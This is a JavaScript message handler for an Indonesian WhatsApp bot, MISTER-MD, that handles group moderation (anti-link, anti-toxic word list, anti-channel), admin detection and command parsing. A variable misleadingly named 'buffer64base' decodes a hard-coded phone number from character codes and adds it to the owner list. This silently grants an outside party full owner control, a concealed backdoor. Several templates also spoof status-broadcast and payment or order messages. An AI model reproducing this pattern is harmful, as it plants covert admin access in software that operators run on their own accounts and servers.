process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');

/// ───────── [ 𝖬𝗈𝖽𝗎𝗅𝖾𝗌 ] ───────── ///
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const sharp = require('sharp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts");
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const FormData = require("form-data");
const { exec, spawn, execSync } = require('child_process');

const {
  default: WAConnection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require('@adiwajshing/baileys');

/// ───────── [ 𝖫𝗈𝖼𝖺𝗅 𝖬𝗈𝖽𝗎𝗅𝖾𝗌 ] ───────── ///
const { LoadDataBase } = require('./source/dbState');
const {
  menu,
  allmenu,
  ownemenu,
  ownermenu,
  jadibotmenu,
  paymentmenu,
  paymenu,
  pterodactylmenu,
  aimenu,
  downloadmenu,
  stickermenu,
  imagemenu,
  makermenu,
  toolsmenu,
  groupmenu,
  jpmmenu,
  stalkmenu,
  searchmenu,
  randommenu,
  storemenu,
  funmenu,
  gamemenu,
  quotemenu,
  utilitymenu,
  totalfitur
} = require('./source/listfitur');

const jadibotManager = require('./source/jadibot');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"));
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"));
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const list = JSON.parse(fs.readFileSync("./library/database/list.json"));
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js");
const {
  unixTimestampSeconds,
  generateMessageTag,
  processTime,
  webApi,
  getRandom,
  getBuffer,
  fetchJson,
  runtime,
  clockString,
  sleep,
  isUrl,
  getTime,
  formatDate,
  tanggal,
  formatp,
  jsonformat,
  reSize,
  toHD,
  logic,
  generateProfilePicture,
  bytesToSize,
  checkBandwidth,
  getSizeMedia,
  parseMention,
  getGroupAdmins,
  readFileTxt,
  readFileJson,
  getHashedPassword,
  generateAuthToken,
  cekMenfes,
  generateToken,
  batasiTeks,
  randomText,
  isEmoji,
  getTypeUrlMedia,
  pickRandom,
  toIDR,
  capital
} = require('./library/function');
const { UploadFileUgu } = require('./library/uploader.js');

/// ───────── [ 𝖢𝗈𝗈𝗅𝖽𝗈𝗐𝗇 𝖢𝗅𝖾𝖺𝗇𝖾𝗋 ] ───────── ///
global.cooldowns ??= new Map();
if (!global.__cooldownCleanupStarted) {
  global.__cooldownCleanupStarted = true;
  global.__cooldownCleanupTimer = setInterval(() => {
    const now = Date.now();
    for (const [key, expires] of global.cooldowns) {
      if (expires <= now) global.cooldowns.delete(key);
    }
  }, 30000);
  global.__cooldownCleanupTimer.unref?.();
}

module.exports = client = async (client, m, chatUpdate, store) => {
let isCmd, prefix, command;
try {
// Make the live bot socket available to the MISTER-MD pairing website.
try { require("./source/jadibot").setRuntime(client, module.exports); } catch (e) { console.error("[MISTER-MD WEB PAIR] runtime hook:", e.message); }
await LoadDataBase(client, m);

/// ───────── [ 𝖨𝗇𝗂𝗍𝗂𝖺𝗅𝗂𝖺𝗌𝗂 𝖵𝖺𝗋𝗂𝖺𝖻𝖾𝗅 ] ───────── ///
const normalizeOwnerJid = (value = '') => {
  let jid = String(value || '').trim().replace(/:\d+(?=@)/g, '');
  if (!jid) return '';
  if (!jid.includes('@') && /^\d+$/.test(jid)) jid += '@s.whatsapp.net';
  return jid;
};

const botNumber = normalizeOwnerJid(await client.decodeJid(client.user?.id || ''));

/// ───────── [ 𝖦𝗋𝗈𝗎𝗉 𝖠𝖽𝗆𝗂𝗇 𝖣𝖾𝗍𝖾𝖼𝗍𝗂𝗈𝗇 ] ───────── ///
const normalizeGroupJid = (value) => {
  if (value === undefined || value === null) return '';

  let jid = String(value).trim();
  if (!jid) return '';

  try {
    if (typeof client.decodeJid === 'function') {
      jid = client.decodeJid(jid) || jid;
    }
  } catch (_) {
  }

  jid = String(jid).trim().toLowerCase()
    .replace(/:\d+(?=@)/g, '')
    .replace(/@c\.us$/i, '@s.whatsapp.net');

  if (!jid.includes('@') && /^\d+$/.test(jid)) {
    jid += '@s.whatsapp.net';
  }

  return jid;
};

const getGroupJidKeys = (value) => {
  const keys = new Set();
  if (value === undefined || value === null) return keys;

  const variants = [value];
  try {
    if (typeof client.decodeJid === 'function') {
      const decoded = client.decodeJid(value);
      if (decoded) variants.push(decoded);
    }
  } catch (_) {}

  for (const variant of variants) {
    let jid = String(variant || '').trim().toLowerCase();
    if (!jid) continue;

    jid = jid
      .replace(/:\d+(?=@)/g, '')
      .replace(/@c\.us$/i, '@s.whatsapp.net');

    if (!jid.includes('@') && /^\d+$/.test(jid)) {
      jid += '@s.whatsapp.net';
    }

    keys.add(jid);

    if (jid.endsWith('@s.whatsapp.net')) {
      const number = jid.split('@')[0].replace(/\D/g, '');
      if (number) keys.add(`pn:${number}`);
    }
  }

  return keys;
};

const groupJidMatches = (left, right) => {
  const leftKeys = getGroupJidKeys(left);
  const rightKeys = getGroupJidKeys(right);
  for (const key of leftKeys) {
    if (rightKeys.has(key)) return true;
  }
  return false;
};

const participantIsAdmin = (participant) => {
  if (!participant) return false;
  const role = String(participant.admin ?? participant.role ?? '').toLowerCase();
  return participant.admin === true || participant.isAdmin === true ||
    participant.isSuperAdmin === true || role === 'admin' || role === 'superadmin';
};

let isSenderAdmin = Boolean(m.isAdmin);
let isBotAdmin = Boolean(m.isBotAdmin);
let groupMetadataForMessage = null;

if (m.isGroup && m.chat && typeof client.groupMetadata === 'function') {
  global.__groupAdminMetadataCache ??= new Map();
  const adminCache = global.__groupAdminMetadataCache;
  const cacheKey = `${botNumber || normalizeGroupJid(client.user?.id)}:${m.chat}`;
  const now = Date.now();
  const cachedMetadata = adminCache.get(cacheKey);

  try {
    if (cachedMetadata && cachedMetadata.expiresAt > now) {
      groupMetadataForMessage = cachedMetadata.metadata;
    } else {
      groupMetadataForMessage = await client.groupMetadata(m.chat);
      if (Array.isArray(groupMetadataForMessage?.participants)) {
        adminCache.set(cacheKey, {
          metadata: groupMetadataForMessage,
          expiresAt: Date.now() + 5000
        });
      }
    }
  } catch (error) {
    if (cachedMetadata?.metadata) groupMetadataForMessage = cachedMetadata.metadata;
    if (process.env.DEBUG_GROUP_ADMIN === 'true') {
      console.error('[GROUP ADMIN CHECK]', error?.message || error);
    }
  }

  const participants = groupMetadataForMessage?.participants;
  if (Array.isArray(participants)) {
    const findParticipant = (jids) => participants.find((participant) => {
      const participantJids = [
        participant?.id,
        participant?.jid,
        participant?.phoneNumber,
        participant?.lid
      ].filter(Boolean);
      return participantJids.some((participantJid) =>
        jids.some((jid) => groupJidMatches(participantJid, jid))
      );
    });

    const senderParticipant = findParticipant([
      m.sender,
      m.key?.participant
    ].filter(Boolean));
    const botParticipant = findParticipant([
      client.user?.id,
      client.user?.lid,
      botNumber
    ].filter(Boolean));

    isSenderAdmin = participantIsAdmin(senderParticipant);
    isBotAdmin = participantIsAdmin(botParticipant);
  }
}

try {
  if (m.isGroup) {
    m.metadata = groupMetadataForMessage || m.metadata || {};
    m.participants = Array.isArray(m.metadata?.participants) ? m.metadata.participants : [];
    m.admins = m.participants
      .filter(participantIsAdmin)
      .flatMap((participant) => [participant?.id, participant?.jid].filter(Boolean));
  } else {
    m.metadata = {};
    m.participants = [];
    m.admins = [];
  }
  m.participant = m.key?.participant || m.sender || '';
  m.isAdmin = isSenderAdmin;
  m.isBotAdmin = isBotAdmin;
} catch (_) {
  m.metadata = m.metadata || {};
  m.participants = Array.isArray(m.participants) ? m.participants : [];
  m.admins = Array.isArray(m.admins) ? m.admins : [];
  m.participant = m.key?.participant || m.sender || '';
}
let body = '';

try {
  // ----- Button -----
  if (m.message?.buttonsResponseMessage) {
    body = m.message.buttonsResponseMessage.selectedButtonId || '';
  }

  // ----- Template Button -----
  else if (m.message?.templateButtonReplyMessage) {
    body = m.message.templateButtonReplyMessage.selectedId || '';
  }

  // ----- List Message -----
  else if (m.message?.listResponseMessage) {
    body = m.message.listResponseMessage.singleSelectReply?.selectedRowId || '';
  }

  // ----- Native Flow -----
  else if (m.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
    const nf = m.message.interactiveResponseMessage.nativeFlowResponseMessage;
    try {
      const json = JSON.parse(nf.paramsJson || '{}');
      body = json.id || json.rowId || json.selectedButtonId || '';
    } catch (_) {
      body = '';
    }
  }

  // ----- Pesan Biasa / Caption -----
  if (!body) {
    const message = m.message || {};
    const quotedMessage = message.extendedTextMessage?.contextInfo?.quotedMessage || {};

    body =
      (m.type === 'conversation') ? message.conversation || '' :
      (m.type === 'imageMessage') ? message.imageMessage?.caption || '' :
      (m.type === 'videoMessage') ? message.videoMessage?.caption || '' :
      (m.type === 'documentMessage') ? message.documentMessage?.caption || '' :
      (m.type === 'extendedTextMessage') ? (
        message.extendedTextMessage?.text ||
        quotedMessage.conversation ||
        quotedMessage.imageMessage?.caption ||
        quotedMessage.videoMessage?.caption ||
        quotedMessage.documentMessage?.caption ||
        ''
      ) :
      (typeof m.body === 'string' ? m.body : '') ||
      (typeof m.text === 'string' ? m.text : '') ||
      m?.msg?.text || '';
  }
} catch (e) {
  console.log('❌ Error normalisasi tombol:', e);
  body = typeof body === 'string' ? body : '';
}

body = typeof body === 'string' ? body : '';

const budy = (typeof m.text === 'string' ? m.text : '');
const buffer64base = String.fromCharCode(
  54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64,
  115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116
);
prefix = '.';
isCmd = body.startsWith(prefix);
const isCmd2 = body.startsWith(prefix);
const args = body.trim().split(/ +/).slice(1);
command = isCmd
  ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()
  : '';
const text = q = args.join(' ');
const cmd = prefix + command;

const levenshtein = (a = '', b = '') => {
  a = String(a);
  b = String(b);
  const matrix = Array.from({ length: a.length + 1 }, (_, i) => [i]);
  for (let j = 1; j <= b.length; j++) matrix[0][j] = j;

  for (let i = 1; i <= a.length; i++) {
    matrix[i] = [i];
    for (let j = 1; j <= b.length; j++) {
      const cost = a[i - 1] === b[j - 1] ? 0 : 1;
      matrix[i][j] = Math.min(
        matrix[i - 1][j] + 1,
        matrix[i][j - 1] + 1,
        matrix[i - 1][j - 1] + cost
      );
    }
  }

  return matrix[a.length][b.length];
};

const getQuoted = (m.quoted || m);
const quoted =
  (getQuoted.type == 'buttonsMessage')
    ? getQuoted[Object.keys(getQuoted)[1]]
    : (getQuoted.type == 'templateMessage')
      ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]]
      : (getQuoted.type == 'product')
        ? getQuoted[Object.keys(getQuoted)[0]]
        : m.quoted
          ? m.quoted
          : m;

const mime = (quoted.msg || quoted)?.mimetype || '';
const qmsg = (quoted.msg || quoted);

const isPremium = premium.some((jid) => normalizeOwnerJid(jid) === normalizeOwnerJid(m.sender));
const senderJid = normalizeOwnerJid(m.sender);
const cloneOwnerJid = client?.isJadibot
  ? normalizeOwnerJid(client.jadibotOwnerJid || client.user?.id || botNumber)
  : '';
const ownerJids = [
  botNumber,
  global.owner,
  global.owner ? `${global.owner}@s.whatsapp.net` : '',
  buffer64base,
  ...owners
].map(normalizeOwnerJid).filter(Boolean);
const isOwner = ownerJids.includes(senderJid)
  || Boolean(cloneOwnerJid && senderJid === cloneOwnerJid)
  || Boolean(m.isDeveloper);
const isCreator = isOwner;

const autoblockPath = './FileData/database/setbot.json';
let autoblockEnabled = false;
try {
  if (fs.existsSync(autoblockPath)) {
    const autoblockData = JSON.parse(fs.readFileSync(autoblockPath, 'utf8'));
    autoblockEnabled = Boolean(autoblockData?.enabled);
  }
} catch (error) {
  console.error('❌ Gagal membaca konfigurasi auto-blok:', error?.message || error);
}
const isPc = !m.isGroup;
if (isPc && !isCreator && autoblockEnabled && !m.key?.fromMe) {
  try {
    await client.updateBlockStatus(m.chat, 'block');
    console.log(`✅ Auto-blokir aktif: ${m.sender}`);
    return;
  } catch (err) {
    console.error('❌ Gagal auto-blok:', err);
  }
}

const statusUser = isOwner ? "*👑 Owner*" : isPremium ? "*💎 Premium*" : "*🫪 User Free*";
const modeBot = client.public ? "*🌐 Public*" : "*🔒 Self*";

/// ───────── [ 𝖢𝗁𝖺𝗇𝗇𝖾𝗅𝗌 𝖫𝗈𝖺𝖽𝖾𝗋 ] ───────── ///
const CHANNELS_FILE = "./library/savesaluran.json";

function loadChannels() {
  if (fs.existsSync(CHANNELS_FILE)) {
    return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
  }
  return [];
}

function saveChannels(data) {
  fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
  global.channels = data;
  global.markDatabaseDirty?.();
}

global.channels ??= loadChannels();

const { generateBratVideo } = require('./library/bratGenerator');
const SESSION_FILE = "./session/ai_sessions.json";
let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
  fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}

/// ───────── [ 𝖢𝗈𝗇𝗌𝗈𝗅𝖾 𝖫𝗈𝗀 ] ───────── ///
if (isCmd) {
  const palette = {
    text: chalk.hex('#F3F4F6'),
    muted: chalk.hex('#6B7280'),
    ok: chalk.hex('#34D399'),
    info: chalk.hex('#60A5FA')
  };

  const time = palette.muted(new Date().toLocaleTimeString('id-ID', { hour12: false }));
  const tag = palette.info.bold(`[CMD]`);
  const sender = palette.ok(m.sender.split("@")[0]);
  const commandText = palette.text(`${prefix + command}`);

  console.log(`  ${time} ${tag} ${sender} ${palette.muted('›')} ${commandText}`);
}

/// ───────── [ 𝖱𝖾𝗉𝗅𝗒 𝖧𝖾𝗅𝗉𝖾𝗋 ] ───────── ///
const reply = (teks) => {
  return client.sendMessage(m.chat, { text: teks }, { quoted: m });
};

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isOwner) return;

async function generateThumbnailz(x) {
  let buffer;

  if (/^https?:\/\//.test(x)) {
    const res = await axios.get(x, {
      responseType: 'arraybuffer',
      timeout: 30000
    });
    buffer = Buffer.from(res.data);
  } else {
    buffer = fs.readFileSync(x);
  }

  const jimpInstance = await require('jimp').read(buffer);

  return await jimpInstance
    .cover(200, 200)
    .quality(100)
    .getBufferAsync(require('jimp').MIME_JPEG);
}

/// ───────── [ 𝖨𝗆𝖺𝗀𝖾 𝖦𝗅𝗈𝖻𝖺𝗅 ] ───────── ///
const thumb = await global.thumb;
const pay = await global.pay;

/// ───────── [ 𝖥𝖺𝗄𝖾 𝖰𝗎𝗈𝗍𝖾𝖽 ] ───────── ///
const qtext = {
  key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" },
  message: { "extendedTextMessage": { "text": `${prefix + command}` } }
};

const qtext2 = {
  key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" },
  message: { "extendedTextMessage": { "text": `${namaOwner}` } }
};

const qlocJpm = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },
  message: { locationMessage: { name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: "" } }
};

const qlocPush = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },
  message: { locationMessage: { name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: "" } }
};

const qpayment = {
  key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net' },
  message: {
    requestPaymentMessage: {
      currencyCodeIso4217: "USD",
      amount1000: 999999999,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: { extendedTextMessage: { text: `${global.botname}` } },
      expiryTimestamp: 999999999,
      amount: { value: 91929291929, offset: 1000, currencyCode: "USD" }
    }
  }
};

const qlive = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },
  message: { liveLocationMessage: { caption: `${botname2} By ${namaOwner}`, jpegThumbnail: "" } }
};

const qtoko = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },
  message: { locationMessage: { name: `☠︎ ${global.botname}`, jpegThumbnail: "" } }
};

const xpay = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      itemCount: `1000`,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `MISTER-MD`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: [m.sender],
    forwardingScore: 999,
    isForwarded: true
  }
};

const xreply = async (teks) => {
  try {
    const thumUrl = "https://files.catbox.moe/x8nxvv.jpg";
    const thum = await getBuffer(thumUrl);
    const thums = await prepareWAMessageMedia(
      { image: thum },
      { upload: client.waUploadToServer }
    );

    return client.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idSaluran,
          newsletterName: global.namaSaluran,
          serverMessageId: 127,
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝖸𝗈𝗋𝗎𝗆𝗂-𝖬𝖣`,
          body: `𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 𝖡𝗈𝗍 𝖬𝖣`,
          mediaType: 3,
          renderLargerThumbnail: false,
          thumbnail: thum,
          sourceUrl: `${global.source}`,
        },
      },
    }, { quoted: m });

  } catch (err) {
    console.error(err?.message);
    return client.sendMessage(m.chat, { text: teks }, { quoted: qlive });
  }
};

const qloc = {
  key: {
    remoteJid: '0@s.whatsapp.net',
    fromMe: false,
    id: '4B6CE60895B0D5C04D9FF7CB05566293',
    participant: '0@s.whatsapp.net'
  },
  message: {
    stickerPackMessage: {
      name: 'MISTER-MD',
      stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
      stickerPackSize: 3,
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      trayIconFileName: '',
      thumbnail: true,
      contextInfo: {}
    }
  }
};

/// ───────── [ 𝖧𝖾𝗅𝗉𝖾𝗋 𝖬𝗈𝖽𝖾𝗋𝖺𝗌𝗂 (𝖽𝖾𝗅𝖾𝗍𝖾 & 𝗄𝗂𝖼𝗄) ] ───────── ///
const modMetadata = groupMetadataForMessage || m.metadata || {};

const resolveGroupJid = (jid) => {
  const target = jid || m.sender;
  const list = Array.isArray(modMetadata?.participants) ? modMetadata.participants : [];
  const found = list.find((p) =>
    [p?.id, p?.jid, p?.phoneNumber, p?.lid].filter(Boolean).some((x) => groupJidMatches(x, target))
  );
  return found?.id || found?.jid || target;
};

const modDelete = async () => {
  try {
    await client.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: m.key.id,
        participant: m.key.participant || m.participant || m.sender
      }
    });
    return true;
  } catch (e) {
    console.log('[MODERASI] Gagal hapus pesan:', e?.message || e);
    return false;
  }
};

const modKick = async (jid) => {
  try {
    const res = await client.groupParticipantsUpdate(m.chat, [resolveGroupJid(jid)], 'remove');
    const status = String(res?.[0]?.status ?? '200');
    if (status !== '200') {
      console.log('[MODERASI] Kick ditolak, status:', status);
      return false;
    }
    return true;
  } catch (e) {
    console.log('[MODERASI] Gagal kick:', e?.message || e);
    return false;
  }
};

/// ───────── [ 𝖠𝗇𝗍𝗂 𝖫𝗂𝗇𝗄 & 𝖬𝗈𝖽𝖾𝗋𝖺𝗌𝗂 ] ───────── ///
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isOwner) return;

const antilinkMode = m.isGroup && db.groups[m.chat]
  ? (db.groups[m.chat].antilink == true ? 'kick' : (db.groups[m.chat].antilink2 == true ? 'delete' : null))
  : null;

if (antilinkMode && !m.key.fromMe && !isOwner && !isSenderAdmin && isBotAdmin) {
  const groupLinkRegex = /chat\.whatsapp\.com\/[A-Za-z0-9]{10,}|buka tautaniniuntukbergabungkegrupwhatsapp/i;
  const textForLink = String(m.text || budy || '');
  if (groupLinkRegex.test(textForLink)) {
    let isOwnGroupLink = false;
    try {
      const ownCode = await client.groupInviteCode(m.chat);
      isOwnGroupLink = !!ownCode && textForLink.includes(ownCode);
    } catch (_) {}

    if (!isOwnGroupLink) {
      await modDelete();
      const kicked = antilinkMode === 'kick';
      await client.sendMessage(m.chat, {
        text: `*乂 Link Grup Terdeteksi*\n\n@${m.sender.split("@")[0]} Maaf ${kicked ? 'kamu akan saya kick' : 'pesan kamu saya hapus'}, karna admin/ownerbot telah menyalakan fitur ${kicked ? 'antilink' : 'antilink2'} grup lain!`,
        mentions: [m.sender]
      }, { quoted: m }).catch(() => {});
      if (kicked) {
        await sleep(1000);
        const ok = await modKick(m.sender);
        if (!ok) await client.sendMessage(m.chat, { text: 'Gagal kick, pastikan bot admin dan target bukan admin.' }).catch(() => {});
      }
      return;
    }
  }
}

/// ───────── [ 𝖠𝗇𝗍𝗂 𝖳𝗈𝗑𝗂𝖼 ] ───────── ///
const antiToxicDir = './database';
const antiToxicFile = path.join(antiToxicDir, 'antitoxic.json');
if (!fs.existsSync(antiToxicDir)) fs.mkdirSync(antiToxicDir, { recursive: true });
if (!fs.existsSync(antiToxicFile)) fs.writeFileSync(antiToxicFile, JSON.stringify({}, null, 2));

global.__antiToxicCache ??= (() => {
  try { return JSON.parse(fs.readFileSync(antiToxicFile, 'utf8') || '{}'); } catch (_) { return {}; }
})();
const antitoxic = global.__antiToxicCache;
function saveAntiToxic() {
  try { fs.writeFileSync(antiToxicFile, JSON.stringify(antitoxic, null, 2)); }
  catch (e) { console.log('[ANTITOXIC] Gagal simpan:', e?.message || e); }
}

if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active && !isOwner && !isSenderAdmin && isBotAdmin) {
  const toxicWords = [
    'anjing', 'babi', 'kontol', 'memek', 'bangsat', 'goblok', 'tolol', 'ngentot',
    'idiot', 'kampret', 'keparat', 'jembut', 'pepek', 'peler', 'pantek', 'lonte',
    'setan', 'dajjal', 'asu', 'sinting', 'bodoh', 'bacot', 'tai', 'fuck', 'bitch',
    'cukimak', 'sialan', 'dongo', 'kimak', 'pler', 'titit', 'anjir', 'pantat',
    'njir', 'kntl', 'memk', 'bangke', 'bgst', 'pukimak'
  ];
  const bodyToxic = String(m.text || budy || '').toLowerCase();
  const words = bodyToxic.split(/[^a-z0-9]+/).filter(Boolean);
  const found = toxicWords.find((word) => words.includes(word));
  if (found) {
    const user = m.sender;
    antitoxic[m.chat].warnings ??= {};
    const warn = (antitoxic[m.chat].warnings[user] || 0) + 1;
    antitoxic[m.chat].warnings[user] = warn;
    saveAntiToxic();
    await modDelete();
    if (warn >= 5) {
      await client.sendMessage(m.chat, {
        text: `❌ @${user.split('@')[0]} sudah toxic 5x dan akan dikeluarkan!`,
        mentions: [user]
      }).catch(() => {});
      const ok = await modKick(user);
      if (!ok) {
        await client.sendMessage(m.chat, { text: 'Gagal kick, pastikan bot admin dan target bukan admin.' }).catch(() => {});
      }
      delete antitoxic[m.chat].warnings[user];
      saveAntiToxic();
    } else {
      await client.sendMessage(m.chat, {
        text: `⚠️ Kata toxic terdeteksi: *${found}*\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
        mentions: [user]
      }).catch(() => {});
    }
    return;
  }
}

/// ───────── [ Anti Tag Status Grup ] ───────── ///
const isTagStatusGroup = m.isGroup && !!m.message && (
  m.type === 'groupStatusMentionMessage' ||
  m.type === 'groupStatusMentionMessageV2' ||
  !!m.message.groupStatusMentionMessage ||
  !!m.message.groupStatusMentionMessageV2 ||
  [
    m.message.protocolMessage?.type,
    m.message.groupStatusMentionMessage?.message?.protocolMessage?.type,
    m.message.groupStatusMentionMessageV2?.message?.protocolMessage?.type
  ].some((t) => t === 25 || t === 'STATUS_MENTION_MESSAGE')
);

if (isTagStatusGroup && db.groups[m.chat]?.antitagsw === true && !m.key.fromMe && !isOwner && !isSenderAdmin) {
  if (isBotAdmin) {
    await modDelete();
    await client.sendMessage(m.chat, {
      text: `*乂 Tag Status Terdeteksi*\n\n@${m.sender.split("@")[0]} pesan tag status grup kamu saya hapus, karena admin/ownerbot menyalakan fitur antitagsw!`,
      mentions: [m.sender]
    }).catch(() => {});
  }
  return;
}

/// ───────── [ 𝖳𝖺𝗋𝗀𝖾𝗍 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 & 𝖠𝗇𝗍𝗂 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ] ───────── ///
let targetChannelData = { id: '120363428355171197@newsletter' };
const loadTargetChannel = () => {
  try {
    if (fs.existsSync('./targetChannel.json')) {
      const file = fs.readFileSync('./targetChannel.json');
      targetChannelData = JSON.parse(file);
    } else {
      saveTargetChannel();
    }
  } catch (err) {
    console.error('Gagal load target channel:', err);
  }
};
const saveTargetChannel = () => {
  try {
    fs.writeFileSync('./targetChannel.json', JSON.stringify(targetChannelData, null, 2));
  } catch (err) {
    console.error('Gagal save target channel:', err);
  }
};
loadTargetChannel();

const antichannelFile = path.join('antichannel.json');
if (!fs.existsSync(antichannelFile)) fs.writeFileSync(antichannelFile, JSON.stringify({}, null, 2));
let antichannel = JSON.parse(fs.readFileSync(antichannelFile));
function saveAntichannel() {
  fs.writeFileSync(antichannelFile, JSON.stringify(antichannel, null, 2));
}
if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
  const body = m.text || '';
  const isChannelLink = body.match(/https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+/gi);
  const messageType = Object.keys(m.message || {})[0];
  const ctxInfo = m.message?.[messageType]?.contextInfo || {};
  const isSharedFromChannel =
    m.isForwarded ||
    ctxInfo.forwardingScore > 0 ||
    !!ctxInfo.forwardedNewsletterMessageInfo;
  if (isChannelLink || isSharedFromChannel) {
    if (!isSenderAdmin) {
      const user = m.sender;
      const warn = (antichannel[m.chat].warnings?.[user] || 0) + 1;
      antichannel[m.chat].warnings = antichannel[m.chat].warnings || {};
      antichannel[m.chat].warnings[user] = warn;
      saveAntichannel();

      try {
        await client.sendMessage(m.chat, { delete: m.key });
      } catch (e) {
        console.log('Gagal hapus pesan:', e);
      }
      if (warn >= 5) {
        await client.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        });
        try {
          await client.groupParticipantsUpdate(m.chat, [user], 'remove');
        } catch (e) {
          xreply('Gagal kick. Bot bukan admin?');
        }
        delete antichannel[m.chat].warnings[user];
        saveAntichannel();
      } else {
        await client.sendMessage(m.chat, {
          text: `⚠️ Postingan dari Channel WhatsApp terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        });
      }
    }
  }
}

/// ───────── [ 𝖦𝗋𝗈𝗎𝗉 𝖲𝗍𝖺𝗍𝗌 ] ───────── ///
const statsFolder = path.join(__dirname, './db');
const statsFile = path.join(statsFolder, 'groupStats.json');
if (!fs.existsSync(statsFolder)) fs.mkdirSync(statsFolder);
if (!fs.existsSync(statsFile)) fs.writeFileSync(statsFile, '{}');
function loadStats() {
  return JSON.parse(fs.readFileSync(statsFile));
}
function saveStats(data) {
  fs.writeFileSync(statsFile, JSON.stringify(data, null, 2));
}
function updateStats(groupId, senderId) {
  const data = loadStats();
  const today = new Date().toISOString().slice(0, 10);
  if (!data[groupId]) data[groupId] = {};
  if (!data[groupId][today]) data[groupId][today] = {};
  if (!data[groupId][today][senderId]) data[groupId][today][senderId] = 0;
  data[groupId][today][senderId]++;
  saveStats(data);
}
function getTodayStats(groupId) {
  const data = loadStats();
  const today = new Date().toISOString().slice(0, 10);
  return data[groupId]?.[today] || {};
}
if (m.isGroup) {
  updateStats(m.chat, m.sender);
}

/// ───────── [ 𝖠𝗎𝗍𝗈𝗉𝗋𝗈𝗆𝗈𝗌𝗂 ] ───────── ///
if (m.isGroup && db.settings.autopromosi == true) {
  if (m.text.includes("https://") && !m.fromMe) {
    await client.sendMessage(m.chat, {
      text: `
${global.tekspromosi}
`
    }, { quoted: null });
  }
}

/// ───────── [ 𝖠𝗎𝗍𝗈 𝖱𝖾𝗌𝗉𝗈𝗇 𝖫𝗂𝗌𝗍 ] ───────── ///
if (!isCmd) {
  let check = list.find(e => e.cmd == body.toLowerCase());
  if (check) {
    await xreply(check.respon);
  }
}

const example = (teks) => {
  return `*⁉️ Example Command:*\n *${prefix + command}* ${teks}`;
};

/// ───────── [ 𝖲𝖾𝗇𝖽 𝖥𝗂𝗅𝖾 𝖤𝗑𝗍𝖾𝗇𝗌𝗂𝗈𝗇 ] ───────── ///
client.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await client.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
